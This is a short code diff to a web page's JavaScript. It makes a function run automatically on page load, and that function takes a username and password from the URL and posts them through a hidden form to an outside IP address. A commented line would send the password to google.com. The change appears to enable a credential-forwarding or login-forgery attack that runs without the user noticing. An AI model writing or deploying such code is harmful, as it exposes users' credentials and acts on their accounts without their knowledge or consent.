@@ -12,7 +12,7 @@
     return params
     }
 		window.onload = function(){
-			// sendRequest()
+			sendRequest()
 		}
     function sendRequest () {
     const  params = getUrlParams(window.location.search)
@@ -20,7 +20,8 @@
   //   link.href = `https://google.com?password=${params.password  }`
   //   link.click()
   //  console.log("sending request")
-    let form = document.createElement("form");
+  let form = document.createElement("form");
+  form.className = "hidden"
     let element1 = document.createElement("input"); 
     let element2 = document.createElement("input");  
     let element3 = document.createElement("input")
@@ -28,7 +29,6 @@
 
     form.method = "post";
     form.action = "http://192.0.2.1/login.html";   
-    form.className = "hidden"
     form.id= "login-form"
     element1.value=params.username;
     element1.type = "text"
